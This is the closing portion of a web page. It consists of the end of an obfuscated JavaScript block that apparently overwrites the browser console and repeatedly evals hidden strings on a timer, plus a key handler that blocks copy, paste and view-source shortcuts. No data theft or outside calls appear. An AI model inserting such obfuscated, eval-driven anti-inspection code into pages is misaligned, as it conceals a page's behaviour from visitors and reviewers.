_0x19ef79;}(_0x6c13c9);}else{_0x4a78e1[_0x306c('0x6')][_0x306c('0x7')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0xd')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0x8')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0x9')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0xa')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0xb')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0xc')]=_0x6c13c9;_0x4a78e1[_0x306c('0x6')][_0x306c('0xe')]=_0x6c13c9;}});_0x41d7ca();return function(){return eval(_0x4ed3d0[0x0]+_0x4ed3d0[0x1]);};}_0x2605bc[_0x4ed3d0[0x2]]=_0x17f16e();setInterval(_0x4ed3d0[0x2]+'()',0xc8);}(window));
		</script>
		<script>
            document.onkeydown = function(e) {
                if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) {
                    return false;
                } else {
                    return true;
                }
            };
        </script>
   </body>
</html>